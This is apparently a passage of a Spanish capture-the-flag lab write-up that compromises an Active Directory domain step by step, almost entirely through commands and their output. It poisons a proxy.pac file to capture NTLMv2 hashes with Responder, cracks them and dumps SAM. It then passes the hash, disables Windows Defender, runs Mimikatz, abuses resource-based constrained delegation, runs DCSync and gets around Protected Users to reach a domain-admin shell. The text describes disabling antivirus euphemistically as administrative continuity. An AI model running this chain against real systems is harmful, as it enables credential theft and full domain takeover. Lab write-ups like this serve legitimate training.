PS C:\inetpub\altroot\pac_testing> icacls proxy.pac
proxy.pac ROUNDSOFT\Infra:(W)
          ROUNDSOFT\Infra:(I)(RX)
          BUILTIN\IIS_IUSRS:(I)(RX)
          NT AUTHORITY\IUSR:(I)(RX)
          BUILTIN\Administrators:(I)(F)
          NT AUTHORITY\SYSTEM:(I)(F)
          NT SERVICE\TrustedInstaller:(I)(F)

Successfully processed 1 files; Failed processing 0 files
PS C:\inetpub\altroot\pac_testing> Get-ADPrincipalGroupMembership yamano | Select Name  

Name
----
Domain Users
Developers
Infra

PS C:\inetpub\altroot\pac_testing>
```

Al responder, asegúrate de incluir el parámetro "-P" seguido del puerto del proxy, que en este caso es el puerto 3128. Esto garantizará que la conexión se enrutará a través del proxy correcto cuando se realicen las modificaciones necesarias en el archivo "proxy.pac".

```shell
❯ sudo responder -I tun0 -P
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----. 
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _| 
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

[+] Listening for events...
```

Hemos modificado el archivo proxy.pac para que utilice nuestro host como proxy en el puerto 3128, donde está escuchando nuestra solicitud de autenticación. Después de esperar unos minutos, hemos recibido un hash NTLMv2 del usuario AThompson. Este hash nos proporciona una forma de autenticarnos como el usuario AThompson y avanzar en nuestra investigación.

```powershell
PS C:\inetpub\altroot\pac_testing> echo 'function FindProxyForURL(url, host){ return "PROXY 10.10.14.10:3128; DIRECT"; }' > proxy.pac  
PS C:\inetpub\altroot\pac_testing> type proxy.pac
function FindProxyForURL(url, host){ return "PROXY 10.10.14.10:3128; DIRECT"; }
PS C:\inetpub\altroot\pac_testing>
```

```bash
❯ sudo responder -I tun0 -P
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

[+] Listening for events...

[Proxy-Auth] NTLMv2 Client   : 10.13.38.19
[Proxy-Auth] NTLMv2 Username : ROUNDSOFT\AThompson
[Proxy-Auth] NTLMv2 Hash     : ATHOMPSON::ROUNDSOFT:1122334455667788:3226D5ADD8CEC459E58BCB2A944E4416:0101000000000000003525685CD8D901466A01CE2E0CBE4400000000020008004F0053005A00430001001E00570049004E002D00330055003800590030004E004600590033004C00350004003400570049004E002D00330055003800590030004E004600590033004C0035002E004F0053005A0043002E004C004F00430041004C00030014004F0053005A0043002E004C004F00430041004C00050014004F0053005A0043002E004C004F00430041004C0007000800003525685CD8D90106000400020000000800300030000000000000000000000000300000A0E6542D491037E632B42B69C0AC5B75A6B6336276CAB6008B4C1EB3B07788A10A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000  
```

Inicialmente, el intento de romper el hash utilizando el archivo "rockyou.txt" con John no tuvo éxito. Sin embargo, después de aplicar algunas reglas adicionales, hemos logrado obtener la contraseña para el usuario AThompson. Resulta interesante destacar que el usuario AThomson es un administrador local en el equipo GELUS. Esto nos brinda un acceso significativo dentro del sistema y nos permite avanzar hacia nuestros objetivos con mayor autoridad y control.

```bash
❯ john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --rules:d3ad0ne
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
sshhiinnoobbii!! (ATHOMPSON)
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
Session completed.
```

```powershell
PS C:\Users\yamano\Documents> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain  

Members

-------------------------------------------------------------------------------
Administrator
ROUNDSOFT\AThompson
ROUNDSOFT\Domain Admins

The command completed successfully.

PS C:\Users\yamano\Documents>
```

Dado que somos administradores locales en el equipo GELUS, al autenticarnos en este equipo recibimos un mensaje de "Pwn3d!", lo que nos permite realizar el volcado de la SAM y visualizar todos los hashes NT. Con esta información, simplemente podemos conectarnos al usuario Administrator utilizando el hash NT mediante un passthehash con Evil-WinRM. Una vez autenticados, finalmente podemos leer la flag que se encuentra en el escritorio del usuario Administrator. Este enfoque nos permite completar nuestros objetivos de manera efectiva y obtener acceso a la información deseada.

```bash
❯ crackmapexec smb gelus.roundsoft.local -u athompson -p 'sshhiinnoobbii!!'
SMB         gelus.roundsoft.local 445    GELUS            [*] Windows 10.0 Build 17763 x64 (name:GELUS) (domain:Roundsoft.local) (signing:False) (SMBv1:False)  
SMB         gelus.roundsoft.local 445    GELUS            [+] Roundsoft.local\athompson:sshhiinnoobbii!! (Pwn3d!)

❯ crackmapexec smb gelus.roundsoft.local -u athompson -p 'sshhiinnoobbii!!' --sam
SMB         gelus.roundsoft.local 445    GELUS            [*] Windows 10.0 Build 17763 x64 (name:GELUS) (domain:Roundsoft.local) (signing:False) (SMBv1:False)  
SMB         gelus.roundsoft.local 445    GELUS            [+] Roundsoft.local\athompson:sshhiinnoobbii!! (Pwn3d!)
SMB         gelus.roundsoft.local 445    GELUS            [*] Dumping SAM hashes
SMB         gelus.roundsoft.local 445    GELUS            Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3e6f84b9fbe9eef55078e76115b3a9c:::
SMB         gelus.roundsoft.local 445    GELUS            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         gelus.roundsoft.local 445    GELUS            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         gelus.roundsoft.local 445    GELUS            WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b89195ed259b08446b62a25dc930530b:::
```

```powershell
❯ evil-winrm -i gelus.roundsoft.local -u Administrator -H e3e6f84b9fbe9eef55078e76115b3a9c  
PS C:\Users\Administrator\Documents> whoami
gelus\administrator
PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
RPG{l3av*******h3s_al0ne!}
```
Para garantizar la continuidad operativa y evitar posibles conflictos, hemos decidido desactivar temporalmente el software antivirus mientras realizamos tareas administrativas. Durante este proceso, utilizamos la herramienta Mimikatz para extraer información relevante, como los hashes de las contraseñas de inicio de sesión. Entre los datos obtenidos, identificamos varios hashes de interés, destacando especialmente el hash correspondiente al usuario 'jops', el cual no estaba previamente registrado en nuestra base de datos

```powershell
PS C:\Users\Administrator\Documents> Set-MpPreference -DisableRealTimeMonitoring $true -DisableIOAVProtection $true
PS C:\Users\Administrator\Documents> cmd /c "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2004.6-0\MpCmdRun.exe" -RemoveDefinitions -All  

Service Version: 4.18.2203.5
Engine Version: 1.1.19200.5
AntiSpyware Signature Version: 1.363.1464.0
AntiVirus Signature Version: 1.363.1464.0

Starting engine and signature rollback to none...
Done!
PS C:\Users\Administrator\Documents> upload mimikatz.exe

Info: Uploading mimikatz.exe to C:\Users\Administrator\Documents\mimikatz.exe

Data: 1807016 bytes of 1807016 bytes copied

Info: Upload successful!

PS C:\Users\Administrator\Documents> .\mimikatz.exe "sekurlsa::logonPasswords" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 391204 (00000000:0005f824)
Session           : Interactive from 1
User Name         : athompson
Domain            : ROUNDSOFT
Logon Server      : SHINRA
Logon Time        : 8/25/2023 6:50:25 PM
SID               : S-1-5-21-2284550090-1208917427-1204316795-1676
	msv :
	 [00000003] Primary
	 * Username : AThompson
	 * Domain   : ROUNDSOFT
	 * NTLM     : 14b1991918cdba8474847c8848a8b656
	 * SHA1     : 2b416c46d974004d9db7f799792639729cf7c137
	 * DPAPI    : da282f62633c3e7bdeadb02816ff7be6
	tspkg :
	wdigest :
	 * Username : AThompson
	 * Domain   : ROUNDSOFT
	 * Password : (null)
	kerberos :
	 * Username : AThompson
	 * Domain   : ROUNDSOFT.LOCAL
	 * Password : (null)
	ssp :
	credman :
	 [00000000]
	 * Username : roundsoft\ruby_adm
	 * Domain   : gelus
	 * Password : b3aut1fu1_lyk_@_g3m!

Authentication Id : 0 ; 68684 (00000000:00010c4c)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/25/2023 6:49:40 PM
SID               : S-1-5-90-0-1
	msv :
	 [00000003] Primary
	 * Username : GELUS$
	 * Domain   : ROUNDSOFT
	 * NTLM     : 0bb6f6f24c1afa9ceabc119fed53b9ba
	 * SHA1     : 332608fd6cb7fdc10af757ae38bf737fb5b8c9a2
	tspkg :
	wdigest :
	 * Username : GELUS$
	 * Domain   : ROUNDSOFT
	 * Password : (null)
	kerberos :
	 * Username : GELUS$
	 * Domain   : Roundsoft.local
	 * Password : 62 c5 38 18 d9 c2 d9 b0 12 30 c0 91 77 5d f3 a1 75 1a 1e d3 a8 e5 b7 b1 5b 83 cb 50 a6 f2 31 19 00 c3 07 6c b3 dc 85 b3 41 3b 8f 16 1b df 74 6d 7e d2 0f d9 4a b2 52 66 4b 54 13 dd 93 dd 15 b3 76 88 62 f3 11 34 8b ea 2c db f2 af 67 d6 67 2f a2 f2 6f 4b 6c 1a 7c ec 1f b7 c2 19 f0 11 d6 98 66 d9 61 23 55 15 2a d7 b5 77 0d 03 18 8a c8 78 1a e7 c8 66 4d d8 c2 1e 36 d7 fb b7 32 ba c6 d4 08 52 be 5a 8e 7d 3b 5c 17 0c 19 f4 83 96 a0 b3 25 8d 43 71 1c 02 80 59 fa df e3 a7 f5 71 bd 53 5d 8d d6 05 0d 7d c7 bc d3 0c 22 f6 bb 67 3f 4b 29 ff 01 52 64 39 a7 d5 41 04 5f 7b 16 31 82 4f 95 50 a7 cd d7 e8 b9 b5 e2 61 28 62 43 81 5d cc 9a 87 95 e2 0e c1 47 7f d7 ef 55 45 e0 22 2f 09 a9 02 23 5e 60 1a 90 68 87 b6 a0 e6 a1 7f a4 0b  
	ssp :
	credman :

Authentication Id : 0 ; 93648 (00000000:00016dd0)
Session           : Batch from 0
User Name         : repository_admin
Domain            : ROUNDSOFT
Logon Server      : SHINRA
Logon Time        : 8/25/2023 6:49:58 PM
SID               : S-1-5-21-2284550090-1208917427-1204316795-1110
	msv :
	 [00000003] Primary
	 * Username : repository_admin
	 * Domain   : ROUNDSOFT
	 * NTLM     : 61191aeb8b9a60d01e41faa8bacb2334
	 * SHA1     : fc4b6cb866a39ff10daacc9273f46a68d03dd0c5
	 * DPAPI    : be550fd796d51b6a89a33bb2f91b8bc2
	tspkg :
	wdigest :
	 * Username : repository_admin
	 * Domain   : ROUNDSOFT
	 * Password : (null)
	kerberos :
	 * Username : repository_admin
	 * Domain   : ROUNDSOFT.LOCAL
	 * Password : (null)
	ssp :
	credman :

Authentication Id : 0 ; 422631 (00000000:000672e7)
Session           : Batch from 0
User Name         : jops
Domain            : ROUNDSOFT
Logon Server      : SHINRA
Logon Time        : 8/25/2023 6:50:28 PM
SID               : S-1-5-21-2284550090-1208917427-1204316795-1602
	msv :
	 [00000003] Primary
	 * Username : jops
	 * Domain   : ROUNDSOFT
	 * NTLM     : f7b8e6e5af23f06fdbb559d1888261fa
	 * SHA1     : f96c0dfad6ef2f6c97d1a1076705a0a65b1b10b8
	 * DPAPI    : 1364f3312f690918fbe42fa9b55adaed
	tspkg :
	wdigest :
	 * Username : jops
	 * Domain   : ROUNDSOFT
	 * Password : (null)
	kerberos :
	 * Username : jops
	 * Domain   : ROUNDSOFT.LOCAL
	 * Password : (null)
	ssp :
	credman :

mimikatz(commandline) # exit
Bye!
```

El usuario 'jops' tiene privilegios en el grupo 'Operators', incluyendo 'GenericWrite' sobre el DC 'SHINRA', lo que permite un ataque RBCD. Utilizando herramientas como Impacket, podemos crear una cuenta de equipo y configurar la delegación de credenciales ('rbcd'), lo que amplía nuestro acceso en la red.

```bash
❯ impacket-addcomputer -computer-name attackersystem$ -computer-pass 123456 'roundsoft.local/jops' -hashes :f7b8e6e5af23f06fdbb559d1888261fa
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account attackersystem$ with password 123456.

❯ impacket-rbcd -delegate-from attackersystem$ -delegate-to SHINRA$ -action write 'roundsoft.local/jops' -hashes :f7b8e6e5af23f06fdbb559d1888261fa  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] attackersystem$ can now impersonate users on SHINRA$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     attackersystem$   (S-1-5-21-2284550090-1208917427-1204316795-10101)
```

Al intentar autenticarnos como la máquina para obtener un ticket suplantando al Administrador, recibimos un error. Sin embargo, logramos suplantar al equipo 'SHINRA$' sin problemas.

```bash
❯ impacket-getST -spn cifs/shinra.roundsoft.local roundsoft.local/'attackersystem$':123456 -impersonate Administrator  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user attackersystem$ or initial TGT not forwardable

❯ impacket-getST -spn cifs/shinra.roundsoft.local roundsoft.local/'attackersystem$':123456 -impersonate SHINRA$  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for user
[*] Impersonating SHINRA$
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in SHINRA$.ccache

❯ export KRB5CCNAME='SHINRA$.ccache'
```

Al autenticarnos con el hash del equipo 'SHINRA$', que es el Controlador de Dominio (DC) y tiene privilegios DCSync sobre el dominio, podemos obtener el hash de 'Administrator'. Sin embargo, al intentar autenticarnos con el hash NT de 'Administrator' a nivel de dominio, nos encontramos con un error debido a una restricción en esta cuenta.

```bash
❯ crackmapexec smb shinra.roundsoft.local -k --use-kcache
SMB         shinra.roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
SMB         shinra.roundsoft.local 445    SHINRA           [+] Roundsoft.local\SHINRA$ from ccache

❯ crackmapexec smb shinra.roundsoft.local -k --use-kcache --ntds drsuapi --user Administrator
SMB         shinra.roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
SMB         shinra.roundsoft.local 445    SHINRA           [+] Roundsoft.local\SHINRA$ from ccache 
SMB         shinra.roundsoft.local 445    SHINRA           [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         shinra.roundsoft.local 445    SHINRA           [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         shinra.roundsoft.local 445    SHINRA           administrator:500:aad3b435b51404eeaad3b435b51404ee:fe29edb1766170b8afe7a55cbf360885:::
❯ crackmapexec smb shinra.roundsoft.local -u Administrator -H fe29edb1766170b8afe7a55cbf360885
SMB         roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\Administrator:fe29edb1766170b8afe7a55cbf360885 STATUS_ACCOUNT_RESTRICTION
``````

La restricción en la autenticación con el hash NT de 'Administrator' se debe a que el usuario pertenece al grupo 'Protected Users'. Sin embargo, esta restricción se puede eludir fácilmente agregando el parámetro '-k' para autenticarnos por Kerberos donde no se aplica. Esto nos permite obtener acceso con éxito ('Pwn3d!'). Posteriormente, podemos conectar con 'wmiexec' para obtener una shell y leer la flag.

```
❯ crackmapexec smb shinra.roundsoft.local -u Administrator -H fe29edb1766170b8afe7a55cbf360885 -k
SMB         shinra.roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
SMB         shinra.roundsoft.local 445    SHINRA           [+] Roundsoft.local\Administrator:fe29edb1766170b8afe7a55cbf360885 (Pwn3d!)
```

```powershell
❯ impacket-wmiexec roundsoft.local/Administrator@shinra.roundsoft.local -hashes :fe29edb1766170b8afe7a55cbf360885 -k -shell-type powershell  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
PS C:\> whoami
roundsoft\administrator

PS C:\> hostname
Shinra

PS C:\> type C:\Users\Administrator\Desktop\flag.txt
RPG{WhY_w0rK_h@r*******N_d3l3g@7e?}

PS C:\>
```

Y eso seria todo respecto a Pwned el Laboratorio.
